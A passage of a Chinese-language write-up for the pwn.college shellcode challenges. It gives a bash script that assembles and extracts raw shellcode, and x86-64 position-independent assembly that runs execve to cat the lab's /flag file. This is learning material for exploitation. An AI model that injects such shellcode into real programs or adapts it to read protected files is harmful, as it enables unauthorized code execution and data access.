---
title: Pwn College Shell Code
---

## 准备工作

首先，我不希望使用类似于 `pwntool` 这类完整的 CTF 框架，这会让我们失去对细节的理解。因此，我们将使用最基础的 `as` 作为我们的汇编器。
并且利用 `objcopy` 等来生成原生的 shellcode 进行注入。

### 编译脚本

```bash
#!/bin/bash
as --64 -o shell shell.s                        # 指示汇编器生成 64 位的代码。
objcopy -O binary -j .text shell shell.bin      # 汇编器生成的文件会包含不必要的元信息，我们使用 objcopy 将 .text 段提取出来。
objdump  -b binary shell.bin -m i386:x86-64 -D  # 输出我们的 shellcode 便于调试。
```

## Challenge 1 Plain Shellcode

这个挑战是最基础的 shellcode，程序直接执行我们注入的 shellcode。由于使用了 ASLR 保护，栈地址是完全随机的，所以我们需要确保我们的 shellcode 是位置无关的。

<details>
<summary>shell.s</summary>
```asm
.section .text
.global _start
_start:
	leaq cmd(%rip), %rdi
	movq %rdi, argv1(%rip)
	leaq arg2(%rip), %rsi
	movq %rsi, argv2(%rip)
	leaq argv1(%rip), %rsi
	movq $0x3b, %rax
	movq $0x0, %rdx
	syscall

cmd: .string "/bin/cat"
argv1:  .long 0
	    .long 0
argv2:  .long 0
	    .long 0
	    .long 0
	    .long 0
arg2: .string "/flag"
```
</details>
